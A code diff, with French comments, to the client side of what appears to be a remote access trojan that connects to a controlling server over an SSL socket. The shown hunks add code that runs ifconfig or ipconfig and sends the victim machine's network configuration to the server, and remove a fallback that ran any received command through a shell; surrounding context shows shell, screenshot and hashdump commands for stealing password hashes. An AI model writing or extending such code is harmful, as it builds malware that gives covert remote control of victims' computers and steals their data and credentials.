@@ -25,7 +25,16 @@ def shell(ssl_socket):
 
 # Fonction permettant d'envoyer la configuration réseau au serveur
 def ipconfig(ssl_socket):
-    print('ipconfig')
+    os_type = os.name # Récupération du nom de l'OS de la machine
+    if os_type == "posix": # Test si la machine est une Linux
+        conf = subprocess.run(['ifconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) # Exécution de la commande "ifconfig" et stockage de ses sorties
+        conf_to_send = conf.stdout + conf.stderr # Concaténation des sorties de la commande "ifconfig"
+    elif os_type == "nt": # Test si la machine est une Windows
+        conf = subprocess.run(['ipconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) # Exécution de la commande "ipconfig" et stockage de ses sorties
+        conf_to_send = conf.stdout + conf.stderr # Concaténation des sorties de la commande "ipconfig"
+    else:
+        conf_to_send = "OS non reconnu" # Gestion d'erreur
+    ssl_socket.send(conf_to_send.encode()) # Envoie de la configuration au serveur
 
 # Fonction permettant d'envoyer la capture d'écran au serveur
 def screenshot(ssl_socket):
@@ -86,9 +95,6 @@ def main():
             hashdump(ssl_socket)
         elif command.lower() == 'exit':
             break
-        else:
-            result = subprocess.run(command, shell=True, capture_output=True, text=True)
-            ssl_socket.send(result.stdout.encode() + result.stderr.encode())
 
     ssl_socket.close() # Fermeture du socket
 
